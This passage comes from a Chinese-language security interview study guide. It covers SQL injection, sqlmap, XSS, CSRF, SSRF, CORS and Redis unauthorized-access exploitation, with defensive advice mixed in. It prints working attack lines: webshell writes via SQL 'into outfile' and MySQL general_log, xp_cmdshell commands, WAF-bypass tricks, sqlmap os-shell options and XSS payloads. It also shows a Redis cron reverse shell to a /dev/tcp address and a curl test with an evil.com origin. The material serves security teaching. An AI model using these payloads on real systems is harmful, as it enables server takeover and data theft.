2、booleab-based（布尔盲注）通过页面返回内容是否正确来判断是否存在注入

3、time-based（时间（延时）注入）通过服务器响应时间的不同（SQL语句的执行长短）来判断注入，可以通过benchmark、sleep等函数造成延时效果，也可以通过构造大笛卡尔积的联合查询表来达到延时的效果。

### 7、如果存在SQL注入怎么判断不同的数据库？

根据报错信息判断

根据执行函数返回的结果判断，比如len()和lenth()、version（）、@@version等

根据注释符判断

### 8、mysql的网站注入，5.0以上和5.0以下有什么区别？

从SQL注入的角度来说，mysql5.0以下版本没有information_schema这个数据库，无法列出表名，只能暴力跑

### 9、mssql差异备份原理及条件

原理：完整备份后，再次对数据库进行修改，差异备份会记录最后的LSN，将shell写入数据库，备份成asp即可getshell

条件：mssql具有dbo或sa权限、支持堆叠查询、找到网站的绝对路径

### 10、SQL注入写shell的条件，用法

条件：

当前用户具有写得权限

找到网站绝对路径

网站有可写目录

Mysql的配置secure_file_priv为空

用法：

Mysql

id=1' and 1=2 union select 1,2,'shell内容' into outfile "绝对路径\shell.php" %23

sqlserver：

id=1';EXEC master..xp_cmdshell 'echo "shell内容" > 绝对路径\shell.asp' –

### 11、sleep被禁用后还能怎么进行SQL注入

Benchmark代替sleep

笛卡尔积盲注

Rlike盲注

Writeup

### 12、SQL注入过滤了逗号，怎么办？

Join绕过

union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);

### 13、什么是宽字节注入？如何操作

宽字节注入原理：

当php开启gpc或者使用addslashes函数时，单引号'被加上反斜杠\'，其中\的URL编码为%5C，我们传入%df'，等价于%df%5C'，此时若程序的默认字符集是GBK，mysql用GBK编码时会认为%df%5C是一个宽字符‘縗’，于是%df%5C'便等价于‘縗'，产生注入。

当在参数中输入单引号的时候，会被转义成\'，这样就无法进行注入。但是在参数中加入一个%df，会被转义成为 %df%5c 那么就会成为一个繁体字，绕过转义，实现注入。

宽字节编码包括：GB2312、GBK、GB18030、BIG5、Shift_JIS

GB2312 不存在宽字节注入

操作：

跟GBK有关，%df’ or 1=1）

id=1%df' and 1=2 union select 1,2,user(),4 %23

### 14、怎么进行盲注速度更快？

DNSlog盲注 二进制延迟注入

### 15、什么是二次注入？

参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并储存在数据库中，导致二次注入

例子：

注册用户名admin'#用户，传入值为admin##'#，但是在存储数据库时值变为admin'#，此时若修改密码为123456，管理员admin密码就被修改为123456

### 16、SQL注入一开始用来判断数据库类型的语句是什么？

1.基于各个数据库特定的表来判断：

Mysql数据库：

http://127.0.0.1/test.php?id=1 and (select count(*) from information_schema.TABLES)>0 and 1=1

access数据库：

http://127.0.0.1/test.php?id=1 and (select count(*) from msysobjects)>0 and 1=1

oracle数据库：

http://127.0.0.1/test.php?id=1 and (select count(*) from sys.user_tables)>0 and 1=1

2.利用一些特殊函数比如len、length

Mysql——len（）

Oracle——length（）

例如：使用and len（‘a’）=1的时候，返回正常页面时，可以推断当前数据库可能是mssql，或mysql，或者db2。反之则可能是oracle和informix

3.基于辅助符号

/* 是mysql中的注释符，返回错误说明该注入点不是mysql

_ 是oracle和mssql支持的注释符 返回正常 说明为这两种数据库类型之一

，是子句查询标识符，oracle不支持多行查询，返回错误，说明可能是oracle数据库

在注入点后加（必须为注入点）;–（一个分号，两个横线），例如：http://xxxx/article/as.asp?id=1;–。如果返回正常的话，说明数据库是MSSQL。在MSSQL数据库中;和–都是存在的，;用来分离两个语句，而–就是注释符，它后面语句都不执行。如果返回错误，基本可以肯定是ACCESS数据库了。

### 17、讲一下sql写入webshell的条件，如果你在的目录没有执行权限怎么办

当前用户具有写得权限

找到网站绝对路径

网站有可写目录

Mysql的配置secure_file_priv为空

目录没有执行权限时：通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell

### 18、SQL注入写入Webshell的三种方法

Union select 写入：

union select '<?php eval($_POST[cmd])?>' into outfile 'web目录';

分隔符写入：

?id=1 INTO OUTFILE '物理路径' lines terminated by （<?php eval($_POST[cmd])?>）#

?id=1 INTO OUTFILE '物理路径' fields terminated by （<?php eval($_POST[cmd])?>）#

?id=1 INTO OUTFILE '物理路径' columns terminated by （<?php eval($_POST[cmd])?>）#

?id=1 INTO OUTFILE '物理路径' lines starting by （<?php eval($_POST[cmd])?>）#

log写入

新版本的mysql在my.ini中设置了导出文件的路径，无法再使用select into outfile来写入一句话木马，这时我们可以通过修改MySQL的log文件来获取webshell。

show variables like '%general%'; #查看配置#

set global general_log = on; #开启general# log模式

set global general_log_file = '网站目录/shell.php'; #设置日志目录为shell地址#

select '<?php eval($_POST[shell]);?>' #写入shell#

set global general_log=off; #关闭general# log模式

### 19、SQL注入里面有一个into outfile函数有什么作用？

满足的‘三个条件’，可以把文件或者一句话木马导入到数据库文件的目录中。

### 20、时间延时注入的原理？

原理：利用if函数，执行判断； 如果正确，直接返回（时间很短，网速有一定影响） 如果不正确，执行时间延迟，常用的函数有sleep和benchmark 以上操作也可以反过来

### 21、Order by注入了解吗？

order by是mysql中对查询数据进行排序的方法

select * from 表名 order by 列名(或者数字) asc；升序(默认升序)

select * from 表名 order by 列名(或者数字) desc；降序

### 22、xp_cmdshell有了解过吗？能用来做什么？

执行xp_cmdshell命令来建立用户，获取操作系统权限的。

可以对mssql数据库提权 需要有sa权限

### 23、报错注入的函数有哪些？

updatexml():是mysql对xml文档数据进行查询和修改的xpath函数

extractvalue()：是mysql对xml文档数据进行查询的xpath函数

floor():mysql中用来取整的函数

exp():此函数返回e(自然对数的底)指数X的幂值

### 24、怎么判断延时注入？

通过sleep()构造payload,如果出现响应时间不一致可能存在延时注入。如’ and sleep(5) --+ 如果页面响应时间超过5秒，则存在延时注入

### 25、为什么参数化查询可以防止SQL注入

使用参数化（预编译、绑定变量）查询时，数据库先进行SQL语句编译（已确定要运行SQL语句的语义），再套用绑定的参数值。也就是说使用了参数化查询后，参数的值不会改变SQL语句的语义，数据库只会按编译的SQL语句语义执行。

### 26、如何突破注入时字符被转义

1、宽字节注入2、hex编码绕过

### 27、SQL注入getshell

#### into outfile写shell

知道网站绝对路径

高权限数据库用户

load_file()开启 secure_file_priv 无限制

网站路径有写的权限

首先基础语法查询是否secure_file_priv无限制

show global variables like '%secure_file_priv%';

在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件

在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell：

select '<?php phpinfo(); ?>' into outfile '/var/www/html/info.php';

#### 日志文件写shell

web文件夹宽松权限可以写入

windows系统下

高权限运行MySQL或者Apache

### 28、SQL注入绕WAF

1、burp安装waf模块

2、通过工具伪造百度、google等user agent头或者伪造白名单特殊目录

3、编码绕过

4、修改请求方式绕过：利用waf的默认规则绕过，

5、复合绕过

6、WAF触发规则的绕过

特殊字符替换空格

特殊字符拼接

注释符包含关键字

空格替换法

使用大小写

双写绕过

关键字替换：比如异或绕过 mod绕过 = | like 绕过

利用WAF本身功能绕过，比如uni*on+sel*ect+1，2，3, 4

组合法 and /*! 1=1*/ %23

把and为&&，urlencode后为%26%26 如：%20%26%26%20-1=-2

### 29、SQL注入哪些是有回显、哪些没回显

没有回显注入：盲注（bool盲注、时间盲注）

有回显注入：联合注入、报错注入

### 30、Order by使用命令

1、按照字段名排序

Select * from user order by username；

2、按照索引进行排序

Select * from user order by 1；

3、降序

Select * from user order by username；

Select * from user order by username DESC；

\1. 按照多列排序

Select * from user order by username，password；

### 31、过滤后用什么

1过滤了用-1

and过滤了用&&

= 过滤了 用in like regexp

or 过滤 用 ||

空格过滤 用 // %a0 %0a

逗号过滤  使用join方法绕过

过滤空格

（1）双空格

（2）//

（3）用括号绕过

（4）用回车代替 //ascii码为chr(13)&chr(10)，url编码为%0d%0a

# Sqlmap面试问题

### 1 sqlmap post 注入三种方法

POST登录框注入：sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables

sqlmap.py -u 登录的地址 --forms 自动判断注入

sqlmap.py -u 登录的地址 --data "指定参数"

自动填写表单：

sqlmap -u 网站地址 -from -dbs（查找数据库）

Sqlmap结合burpsuite：

sqlmap -r 指定文件

指定表单注入：

sqlmap -u 网站地址 –date "userid=aaa&passwd=bbbb”（检查是否有注入）

sqlmap -u 网站地址 –date "userid=aaa&passwd=bbbb” –current-db（查找当前数据库）

### 2、sqlmap一些使用命令

批量注入：-m

绕过waf防火墙：sqlmap.py -u 注入点 -v 3 --dbs --batch --tamper

探测数据库类型：--dbs

–dump-all #列出所有数据库所有表#

线程数，可以让sqlmap跑的更快：-threads

获取表名：--tables -D 数据库名

字段名：--columns -T user -D abc

读文件内容：--file-read /etc/password

系统交互的shell：--os-shell

绕waf：--tamper "”

–os-cmd=id #执行系统命令#

–os-shell #系统交互shell#

–os-pwn #反弹shell#

–file-read #读取指定文件#

–file-write #写入本地文件(–file-write# /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)

–file-dest #要写入的文件绝对路径#

–string "” #指定关键词#

–referer "” #使用referer欺骗#

--delay 延迟的时间

--safe-freq 次数

### 3、sqlmap --os-shell原理

使用此条命令必须获取到目标站点的绝对路径，且当前数据库权限必须是dba，sa。他的工作原理是使用 into outfile()函数去写一个可以进行文件上传的 php文件，再根据这个文件写了一个木马，通过木马进行命令执行。

其条件必须具备以下几点：

1.已知目标站点的绝对路径

2.已知目标站点的脚本语言

3.当前数据库权限必须是dba，sa权限

4.网站不查杀木马文件

### 4、Sqlmap常用命令

-u 指定url

-r 指定请求数据包的文本文件

-m 批量跑get注入

–current-db 获取当前数据库

–table 获取指定数据库下的数据表

–tamper 指定tamper脚本，进行bypass

–os-shell 获取shell

–random-agent 随机指定user-agent

# XSS（跨站脚本攻击）的面试题总结

### 2 XSS原理是什么？

参数赋值给变量时未经过滤，输出时没有进行html实体编码

### 3 常用XSS进行哪些利用

使用document.cookie（）获取受害者cookie，从而登录网站

对某些功能点进行伪造，如精心伪造一个登录button，

### 4 XSS的三种类别有什么不同

反射型：不保存在数据库，每次执行漏洞只能进行一次攻击

存储型：将JS代码保存在数据库中，每次读取数据时，都会执行JS代码

DOM型：与反射型类似，但不需要与后端服务进行通信

### 5 XSS防御方法

对输出端的数据进行编码

验证输入

\1. 对输出端的数据进行编码

1）将一些字符进行转义，例如 <，> 进行转义

2）白名单，通过一些标签限制

3）不要把后端传进来的数据直接作为 HTML 渲染，进行处理

\2. CSP 的应用

严格的 CSP 在 XSS 的防范中可以起到以下的作用：

禁止加载外域代码，防止复杂的攻击逻辑。

禁止内联脚本执行。

禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。

合理使用上报可以及时发现 XSS，利于尽快修复问题。

\3. 其他安全措施

HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。

验证码：防止脚本冒充用户提交危险操作。

### 5、XSS的payload简单说几个

PHP：

<div>
<script>alert("xss”)</script>
</div>

<div>
<script>

" onclick="alert(1)"

"><img src=x onerror=prompt(1)>

<script>prompt</script>
</div>

<div>
<script>confirm</script>
</div>

JAVA：

<div>
<div onclick="alert('xss')">
</div>

### 6、防止XSS，前端后端两个角度？

前端：

用户输入特殊字符过滤转义为html实体

用户输入编码

后端：

实体化编码

函数过滤

限制字符长度

### 7、XSS除了获取cookie还能做什么？

获取管理员ip

XSS蠕虫

钓鱼攻击

前端JS挖矿

键盘记录

屏幕截图

### 8、储存型XSS危害

窃取用户cookie

XSS钓鱼攻击

XSS蠕虫攻击

获取键盘记录

获取用户信息

获取屏幕截图

### 9、XSS如何修复或防御

对输出数据进行编码和转义

对输入数据进行严格过滤

给关键cookie使用http-only

### 10、如何验证存在XSS漏洞

挖掘XSS的

第一步：找输入，也就是用户可以操作代码的位置

第二步：找输出，也就是找到第一步用户输入的代码在网页的各处地方进行输出

第三步：构造payload，通过查看源代码，构造出payload

### 11、平时怎么挖XSS漏洞

手工的方式会对于数据库有交互的用户输入位插入XSS语句，对一些参数会测其是否存在反射型XSS

工具一般使用XSSstrike

### XSS漏洞的挖掘

黑盒测试

尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：

· URL的每一个参数

· URL本身

· 表单

· 搜索框

常见业务场景

· 重灾区：评论区、留言区、个人信息、订单信息等

· 针对型：站内信、网页即时通讯、私信、意见反馈

· 存在风险：搜索框、当前目录、图片属性等

白盒测试(代码审计)

关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。

PHP中常见的接收参数的方式有$_GET、$_POST、$_REQUEST等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。

也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。

大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。

同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。

### 12、在有shell的情况下，如何使用XSS实现对目标网站的长久控制？

后台登录处加一段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。

在登录后才可以访问的文件中插入 XSS 脚本。

### 13、加固建议

1）过滤输入的数据，对例如：" ‘ ”，" " ”，” < "，” > "，” on* "，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。

（2）验证数据的类型，验证其格式、长度、范围和内容。

（3）在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。

（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。

### 14、XSS防御函数

htmlspecialchars：把预定义的字符转换为HTML实体，默认配置不会过滤单引号和双引号

htmlentities：把特殊字符转换为html实体

strip_tags :自动去掉字符串中HTML/XML和PHP的标签

### 15、XSS绕过

前端限制绕过

大小写混合

拼凑绕过

编码

注释干扰后台绕过

Htmlspecialchars

### 16、使用过什么XSS平台吗？

1.清华蓝莲花战队的BlueLotus。

2.xss-platform平台。

2.kali中的beef平台。

3.利用工具Postman。

### 17、空格被过滤的情况

用/代替空格 用回车符CR（%0d）和换行符LF（%0a）取代空格

### 18、双引号、单引号被过滤的情况

用反单引号绕过、编码绕过

### 19、括号被过滤的情况

用throw来绕过

### 20、url地址被过滤的情况

使用url编码、

使用ip地址（十进制ip、八进制ip、十六进制ip）

用//代替http：//

### 21、关键字被过滤的情况

用<svg>标签(个人感觉比较少被过滤,起码比<script>标签少)

### 22、XSS持久化如何实现？

XSS持久化依赖于储存型XSS漏洞，当发现有存储型XSS漏洞时，会尝试插入一段JS代码用于窃取cookie，配合hook可以实现更多操作。持久化一般采用无感记录，如登录记录，cookie记录等，并发送到指定接收端。

### 23、XSS可以插在哪里？

用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过

```
<!-- 用户输入 -->

<!-- --><script>alert('hack')</script><!-- -->
```

用户输入作为标签属性名，导致攻击者可以进行闭合绕过

```
<div 用户输入="xx"> </div>

<div ></div><script>alert('hack')</script><div a="xx"> </div>
```

用户输入作为标签属性值，导致攻击者可以进行闭合绕过

```
<div id="用户输入"></div>

<div id=""></div><script>alert('hack')</script><div a="x"></div>
```

用户输入作为标签名，导致攻击者可以进行闭合绕过

```
<用户输入 id="xx" />

<><script>alert('hack')</script><b id="xx" />
```

用户输入作为CSS内容，导致攻击者可以进行闭合绕过

```
<style>用户输入<style>
<style> </style><script>alert('hack')</script><style> </style>
```

### 24、XSS的攻击过程

反射型XSS漏洞：

\1. Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点需要Alice使用用户名/密码进行登录，并存储了Alice敏感信息(比如银行帐户信息)。

\2. Tom 发现 Bob的站点存在反射性的XSS漏洞

\3. Tom 利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击

\4. Alice在登录到Bob的站点后，浏览了 Tom 提供的恶意链接

\5. 嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给 Tom。

\6. Tom 利用获取到的cookie就可以以Alice的身份登录Bob的站点，如果脚本的功更强大的话，Tom 还可以对Alice的浏览器做控制并进一步利用漏洞控制

存储型XSS漏洞：

\1. Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。

\2. Tom检测到Bob的站点存在存储型的XSS漏洞。

\3. Tom在Bob的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其它用户来阅读该热点信息。

\4. Bob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行。

\5. Tom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发动一起XSS攻击

# XSS和CSRF的区别

XSS称为跨站脚本攻击 CSRF称为跨站请求伪造

XSS不需要登录 CSRF需要用户登录信息

XSS攻击客户端 CSRF访问服务端

XSS劫持用户信息 CSRF伪造用户身份访问正常网站

# CSRF和XSS和XXE有什么区别，以及修复方式？

XSS 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用 HTTP Only 来禁止 JavaScript 读取 Cookie 值、输入时校验、输出时采用 html 实体编码。

CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验Referer

XXE 是 XML 外部实体注入攻击，XML 中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML 解析库在调用时严格禁止对外部实体的解析。

# CSRF、SSRF和重放攻击有什么区别?

CSRF是跨站请求伪造攻击，由客户端发起

SSRF是服务端请求伪造，由服务器发起

重放攻击是将截获的数据包进行重放，达到身份认证等目的

# XSS与SSRF的区别？

SSRF属于服务端攻击，无需输出就能攻击，利用dnslog来实现攻击的，结果值在dnslog日志体现

XSS属于客户端攻击，必须有输入和输出，XSS不需要登录就可以实现脚本攻击

# XSS、csrf、ssrf区别

XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出「现了预期值之外的 脚本语句被执行」。

CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以 「利用用户的Cookie信息伪造用户请求发送至服务器。」 ，重点强调的是伪造。

SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。

# CRLF注入

### 注入原理

CRLF 指的是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)。

CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据输出在HTTP响应头中。（XSS一般输出在主体中）

所以CRLF注入漏洞的检测也和XSS漏洞的检测差不多。通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。

CRLF 是"回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。

### 修复建议

　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。

# CORS原理、利用及修复

(1)CORS全称是"跨域资源共享"（Cross-origin resource sharing）,Origin源未严格，从而造成跨域问题,允许浏览器向跨源服务器，发出XMLHttpRequest请求

(2)Origin为*的时候，使用curl测试CORS，

curl -H "Origin: https://evil.com” -I

# LDAP注入

### 原理

由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。

### 修复建议

对用户的输入内容进行严格的过滤。

# CSRF（跨站请求伪造）

### 1、CSRF原理

程序员开发的时候，未对相关页面进行token和referer判断，造成攻击者可构造自己的URL地址欺骗目标用户点击

### 2、如何挖掘CSRF漏洞

扫描器

修改密码的地方

添加用户的地方

数据库备份的地方

数据交易、支付

其他一些对话框钓鱼页面

### 3、防御和修复建议

（1）验证请求的Referer是否来自本网站，但可被绕过。

（2）在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。

ban掉不明域访问——使用同源检测与Samesite Cookie

多夹一层验证手段CSRF Token

### 4、CSRF绕过

针对CSRF Token与同源政策的绕过手段

1.将POST 修改为GET 请求进行绕过

2.删除CSRF Token进行绕过

3.CSRF Token未与用户Session绑定

4.当Cookie中的CSRF值与CSRF Token的值一致时

5.对不严格的Referer限制进行绕过

### 5、CSRF漏洞检测

最简单的方法就是抓取一个正常请求的数据包，去掉referer字段后再重新提交，如果提交有效，那么基本上可以确定存在csrf漏洞

也可以使用csrf漏洞检测工具，比如说CSRFtester,CSRF request builder等等

以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFtester进行测试时，首先需要抓取我们在浏览器中访问过的所有连接以及所有的表单信息等信息，让后通过CSRFTester中修改响应的表单等信息，重新提交，这相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。

6、防御CSRF攻击

目前防御CSRF攻击主要有三种策略：

验证HTTP Referer字段;在请求地址中添加token并验证；

在HTTP头中自定义属性并验证

（1）验证HTTP Referer字段

（2）在请求中添加token并验证

（3）在HTTP头中自定义属性并验证

### 6、CSRF原理以及过程

\1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；

\2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；

\3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；

\4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；

\5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。

# SSRF服务端请求伪造

### 1、SSRF原理

SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，

比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等，SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测到这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源，SSRF利用UC你在缺陷的Web英语作为代理员攻击远程和本地的服务器

### 2、PHP中SSRF利用的相关危险函数

file_get_contents()

file_get_contents 这一函数是把 传入的参数(变量) 写入字符串，当把 传参 是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。

fsockopen()

curl_exec()

curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供 curl_setopt()，curl_exec()和curl_close() 函数使用。

### 3、PHPSSRF的危险协议

file 协议结合目录遍历读取文件。

gopher 协议打开端口。

dict 协议主要用于结合 curl 攻击。

http 协议进行内网探测。

Sftp

Ldap

Tftp

### 3.1、JAVA ssrf中的伪协议

file ftp mailto http https jar netdoc

### 4、SSRF有哪些绕过方法

使用@：http://A.com@10.10.10.10 = 10.10.10.10

IP地址转换成十进制、八进制：127.0.0.1 = 2130706433

使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx

端口绕过：ip后面加一个端口

xip.io：10.0.0.1.xip.io = 10.0.0.1

通过js跳转..

利用DNS解析

利用句号（127。0。0。1）

利用[::]（http://[::]:80/）；

利用短地址（http://dwz.cn/11SMa）；

协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://）

### 5、防御方法

1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法；

2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态；

3、限制请求的端口为http常用的端口，比如，80,443,8080,8090；

4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网；

5、禁用不需要的协议。仅允许http和https请求；

6、使用正则对参数进行效验，防止畸形请求绕过黑名单。

7、禁止30x跳转

### 6、SSRF一般出现在哪里，你是如何判断这个点存在SSRF漏洞的

5.1. 社交分享功能：获取超链接的标题等内容进行显示

5.2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览

5.3. 在线翻译：给网址翻译对应网页的内容

5.4. 图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片

5.5. 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验

5.6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试

5.7. 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作

5.8. 数据库内置功能：数据库的比如mongodb的copyDatabase函数

5.9. 邮件系统：比如接收邮件服务器地址

5.10. 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等

5.11. 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞

5.12.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）

### 7、SSRF漏洞验证方式

排除法：浏览器f12查看源代码看是否是在本地进行了请求

比如：该资源地址类型为 http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞

dnslog等工具进行测试，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)

抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址

从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址

通过二级域名暴力猜解工具模糊猜测内网地址

通过file协议读取内网信息获取相关地址

直接返回的Banner、title、content等信息

留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。

### 8、SSRF怎么结合Redis相关漏洞利用？

主要通过两种协议，dict协议和gopher协议。

dict协议利用redis相关漏洞：

gopher协议利用redis未授权访问漏洞写入webshell

### 9、SSRF可以使用哪些协议，大致讲讲gopher伪协议攻击redis或其他服务

file:// 利用file伪协议可以读取系统内存在的文件

dict:// 利用dict伪协议可以对内网主机进行端口探测，横向打点，会返回其banner信息

gopher:// 利用gopherr伪协议可以向服务器发送精心构造的GET或POST请求数据包

利用方式 SSRF进行内网渗透 -> gopher伪协议反弹shell -> redis写webshell

### 10、SSRF漏洞利用？

本地文件读取

服务探测、端口扫描

攻击内网redis、mysql、fastcgi等服务

利用到的协议有：http/s、file、gopher、tftp、dict、ssh、telnet

### 11、怎么找SSRF漏洞，SSRF可以做什么

SSRF称为服务端请求伪造攻击，通常是目标系统对外发起请求的情况下才会造成该攻击生效，一般是通过某些对外发起请求的参数，攻击者通过SSRF可以对目标系统进行内网打点，使用file伪协议可以读取系统内的文件，使用dict伪协议可以查看内网存活主机，使用gopher伪协议反弹shell，配合redis写shell操作。

# Redis未授权访问漏洞

## 了解过redis数据库和常见的漏洞吗？

redis是一个非关系型数据库，使用的默认端口是6379。常见的漏洞是未授权访问漏洞，攻击者无需认证就可以访问内部数据。

利用手段主要有：

### 1.向root权限账户写入ssh公钥文件，直接免密登录服务器。(受害者redis非root权限运行会报错)

条件：

服务器存在.ssh目录且具有写入的权限

原理：

在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。

### 2.写入webshell

条件：

已知web绝对路径。

步骤：

\1. redis -cli -h 192.168.x.x 连接目标服务器

\2. config set dir "/var/www/html" 设置保存文件路径

\3. config set dbfilename shell.php 设置保存文件名

\4. set x "\n\n<?php @eval($_POST['cmd']); ?>\n" 将webshell写入x键值中

\5. save 保存

局限：

1.服务器处于内网，写入webshell后我们的公网IP无法连接

2.服务器IP地址不固定

3.6379端口不允许入方向

4.上传webshell可能直接被杀毒软件删除

### 3.反弹连接shell

设置监听端口，常用的工具1.msf 2.netcat 3.socat

利用msf设置监听步骤：

\1. use exploit/multi/handler

\2. set payload generic/shell_reverse_tcp

\3. set lhost 192.168.x.x 默认监听端口为4444

\4. run

### 4.定时任务反弹shell

步骤：

定时任务用的表达式 ：Cron表达式是一个字符串，该字符串由6个空格分为7个域，每一个域代表一个时间含义。分 时 天 月 周 user-name(用户) command(命令) 比如每过一分钟向root用户的定时任务中写入反弹连接命令

(1) config set dir /var/spool/cron/ //目录切换到定时任务的文件夹中

(2) config set dbfilename root //设置保存文件名

(3)set x "\n * * * * * bash -i >& /dev/tcp/192.168.96.222/7777 0>&1\n" //将反弹shell写入x键值中

(4)save //保存

利用定时任务反弹shell在目标系统是Centos上可用，Ubuntu上有限制

理由如下：

